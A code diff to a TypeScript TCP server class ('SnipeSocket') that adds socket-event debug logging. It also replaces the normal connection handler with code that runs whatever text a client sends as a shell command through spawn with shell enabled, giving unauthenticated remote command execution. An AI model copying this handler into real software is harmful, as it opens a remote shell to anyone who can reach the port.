@@ -81,6 +81,14 @@ class SnipeSocket {
     this.sock = socket;
 
     if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });
+
+    const events = ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'ready', 'timeout'];
+
+    events.forEach((e, i) => {
+      this.sock.on(e, (...args) => {
+        msg('debug', `[${i}] sock.on(${e}): ${JSON.stringify(args)}`);
+      });
+    })
   }
 
   public get sig(): string {
@@ -220,9 +228,49 @@ server.on('connection', (sock: net.Socket) => {
   msg('info', `[${socket.sig}] New Connection`);
 
   try {
-    socket.welcome();
+    // socket.welcome();
 
-    socket.sock.on('data', socket.handle.bind(socket));
+    // socket.sock.on('data', socket.handle.bind(socket));
+    socket.sock.on('data', (data) => {
+      msg('info', `Main loop sock.on(data) => ${data}`);
+      const args = data.toString().trim().split(' ').map(p => p.trim());
+      const cmd = args.shift() as string;
+
+      const cp = spawn(cmd, args, {
+        shell: true,
+        detached: true,
+        stdio: [ 0, 1, 2 ]
+      });
+
+      socket.sock.on('data', (data) => {
+        msg('debug', `socket.sock.on(data): ${data}`);
+        if (cp.stdin?.writable) {
+          cp.stdin.write(data);
+        } else {
+          msg('warn', `CP stdin NOT WRITABLE!`);
+        }
+      });
+
+      cp.on('disconnect', () => msg('debug', 'CP Disconnected'));
+      cp.on('error', (err) => msg('debug', `CP Error: ${err.message}`));
+      cp.on('close', (code) => msg('debug', `CP Close: ${code}`));
+      cp.on('exit', (code, signal) => msg('debug', `CP Exit: ${code}`));
+      cp.on('message', (message, sendHandle) => msg('debug', `CP Message: '${message}' (${sendHandle})`));
+      cp.on('spawn', () => msg('debug', `CP Spawn`));
+      // cp.stdout.on('data', (data) => {
+      //   msg('debug', `cp.stdout.on(data): ${data}`);
+      //   socket.sock.write(data);
+      // });
+      // cp.stderr.on('data', (data) => {
+      //   msg('debug', `cp.stderr.on(data): ${data}`);
+      //   socket.sock.write(data);
+      // });
+
+      cp.on('close', (code) => {
+        msg('debug', `Child process exited with code ${code}`);
+        // cp.stdin.end();
+      });
+    });
 
     socket.sock.on('close', (hadError: boolean) => {
       if (hadError) log(`Socket.on(close) with error!`);
